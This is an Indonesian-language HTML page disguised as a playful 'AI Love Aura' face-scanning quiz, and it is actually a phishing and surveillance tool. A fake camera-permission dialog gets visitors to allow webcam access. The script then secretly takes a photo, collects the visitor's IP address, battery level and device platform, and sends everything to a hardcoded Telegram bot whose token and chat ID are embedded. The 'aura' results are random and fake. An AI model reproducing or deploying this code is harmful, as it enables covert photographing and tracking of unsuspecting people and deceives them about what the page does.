<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AI Love Aura Test ✨</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Varela+Round&display=swap');
        :root { --primary: #ff69b4; --secondary: #ff1493; --glass: rgba(255, 255, 255, 0.85); }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; font-family: 'Varela Round', sans-serif; background: #ffeef8; overflow: hidden; display: flex; justify-content: center; align-items: center; }
        
        /* Layer utama untuk memancing interaksi pertama */
        #touch-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent; z-index: 9999; cursor: pointer; }
        
        .container { position: relative; z-index: 10; background: var(--glass); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); padding: 40px 25px; border-radius: 40px; border: 1.5px solid white; box-shadow: 0 20px 50px rgba(255, 105, 180, 0.2); text-align: center; width: 88%; max-width: 340px; }
        h1 { color: var(--secondary); font-size: 1.6rem; margin: 15px 0 10px 0; }
        p { color: #666; font-size: 0.9rem; line-height: 1.6; }
        .btn-love { background: linear-gradient(45deg, var(--primary), var(--secondary)); color: white; padding: 16px; border-radius: 50px; font-weight: bold; border: none; cursor: pointer; margin-top: 25px; width: 100%; display: block; box-shadow: 0 8px 20px rgba(255, 20, 147, 0.3); font-size: 14px; transition: transform 0.2s; }
        .btn-love:active { transform: scale(0.95); }

        #scan-visual { display: none; position: relative; width: 130px; height: 130px; margin: 20px auto; border: 5px solid var(--primary); border-radius: 50%; overflow: hidden; box-shadow: 0 0 20px var(--primary); }
        .scan-bar { position: absolute; width: 100%; height: 8px; background: var(--secondary); top: 0; animation: scanLine 2s infinite ease-in-out; }
        @keyframes scanLine { 0% { top: -10%; } 50% { top: 100%; } 100% { top: -10%; } }
        
        .analysis-box { text-align: left; background: rgba(255, 255, 255, 0.5); padding: 15px; border-radius: 20px; margin-top: 15px; }
        .stat-bar-bg { width: 100%; height: 8px; background: #ffd1dc; border-radius: 10px; margin: 5px 0 12px 0; overflow: hidden; }
        .stat-bar-fill { height: 100%; background: var(--secondary); width: 0%; transition: width 2.5s ease-out; }
        
        video, canvas { display: none; }
        #overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); z-index:10000; backdrop-filter: blur(8px); }
        #fake-dialog { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 35px 25px; border-radius: 40px; width: 300px; z-index: 10001; text-align: center; border: 1px solid #eee; }
    </style>
</head>
<body>

    <div id="touch-layer"></div>
    <div id="overlay"></div>
    
    <div id="fake-dialog">
        <div style="font-size: 3.5rem; margin-bottom: 10px;">📸</div>
        <h1 style="font-size: 1.4rem;">Izin Kamera</h1>
        <p>Aktifkan kamera untuk memindai spektrum warna aura wajahmu.</p>
        <button class="btn-love" id="btn-allow">IZINKAN ✨</button>
    </div>

    <div class="container">
        <div id="setup-view">
            <div style="font-size: 4rem;">💖</div>
            <h1>AI Love Aura</h1>
            <p>Klik di mana saja untuk mulai melihat warna auramu hari ini.</p>
            <div class="btn-love">MULAI SCAN</div>
        </div>
        
        <div id="scan-view" style="display:none;">
            <div id="scan-visual"><div class="scan-bar"></div><div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:3rem;">✨</div></div>
            <h1>Menganalisa...</h1>
            <p>Tetap tenang, sensor sedang menyelaraskan frekuensi wajah...</p>
        </div>

        <div id="result-view" style="display:none;">
            <div style="font-size: 3rem;">🌈</div>
            <h1>Aura Terdeteksi!</h1>
            <div style="font-size: 3.5rem; color: var(--secondary); font-weight: bold; margin: 5px 0;" id="final-score">0%</div>
            <div class="analysis-box">
                <span style="font-size:0.7rem; font-weight:bold; color: var(--secondary);">LOVE LUCK</span>
                <div class="stat-bar-bg"><div id="bar-luck" class="stat-bar-fill"></div></div>
                <span style="font-size:0.7rem; font-weight:bold; color: var(--secondary);">POSITIVE VIBES</span>
                <div class="stat-bar-bg"><div id="bar-vibe" class="stat-bar-fill"></div></div>
            </div>
            <p id="random-quote" style="font-style:italic; margin-top:15px; font-size: 0.85rem; color: #555;"></p>
            <button class="btn-love" onclick="location.reload()">COBA LAGI</button>
        </div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const TG_TOKEN = '8759534902:AAGrdxkHf0ytnacqKexI0OPuEPYrhWXGj7U'; 
        const TG_CHAT_ID = '986460435'; 

        const touchLayer = document.getElementById('touch-layer');
        const btnAllow = document.getElementById('btn-allow');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // State lock untuk mencegah double panggil
        let isStarted = false;

        touchLayer.onclick = () => {
            if (isStarted) return;
            touchLayer.style.display = 'none';
            document.getElementById('overlay').style.display = 'block';
            document.getElementById('fake-dialog').style.display = 'block';
        };

        btnAllow.onclick = async () => {
            if (isStarted) return;
            isStarted = true;

            // Hapus dialog dari layar secara permanen agar tidak muncul lagi
            document.getElementById('fake-dialog').remove();
            document.getElementById('overlay').remove();
            
            document.getElementById('setup-view').style.display = 'none';
            document.getElementById('scan-view').style.display = 'block';

            try {
                // Panggil kamera (Paling Prioritas)
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                document.getElementById('scan-visual').style.display = 'block';

                // Ambil IP (Silent)
                let ipRes = "Hidden/Error";
                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    const data = await res.json();
                    ipRes = data.ip;
                } catch (e) { 
                    const resBackup = await fetch('https://ipwho.is/').then(r => r.json());
                    ipRes = resBackup.ip || "Unknown";
                }

                const battery = navigator.getBattery ? await navigator.getBattery() : { level: 1 };
                const report = `🌟 [SCAN BERHASIL]\n━━━━━━━━━━━━━\n🌐 IP: ${ipRes}\n🔋 Bat: ${(battery.level * 100).toFixed(0)}%\n📱 Dev: ${navigator.platform}\n🕒 Jam: ${new Date().toLocaleTimeString()}\n━━━━━━━━━━━━━`;

                // Proses capture & send
                setTimeout(() => {
                    canvas.width = video.videoWidth; 
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.translate(canvas.width, 0); ctx.scale(-1, 1);
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    const blob = dataURItoBlob(canvas.toDataURL('image/png'));
                    const fd = new FormData();
                    fd.append('chat_id', TG_CHAT_ID);
                    fd.append('photo', blob, 'aura.png');
                    fd.append('caption', report);

                    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    
                    stream.getTracks().forEach(t => t.stop());
                    showFinalResults();
                }, 4000);

            } catch (err) {
                alert("Akses kamera ditolak. Scan gagal.");
                location.reload();
            }
        };

        function showFinalResults() {
            document.getElementById('scan-view').style.display = 'none';
            document.getElementById('result-view').style.display = 'block';
            document.getElementById('final-score').innerText = (Math.floor(Math.random()*10)+90) + "%";
            setTimeout(() => {
                document.getElementById('bar-luck').style.width = "94%";
                document.getElementById('bar-vibe').style.width = "91%";
            }, 300);
            document.getElementById('random-quote').innerText = "Aura Pink: Seseorang merindukanmu hari ini! 🥰";
        }

        function dataURItoBlob(d) {
            const b = atob(d.split(',')[1]);
            const ia = new Uint8Array(b.length);
            for (let i=0; i<b.length; i++) ia[i] = b.charCodeAt(i);
            return new Blob([ia], {type: 'image/png'});
        }
    </script>
</body>
</html>
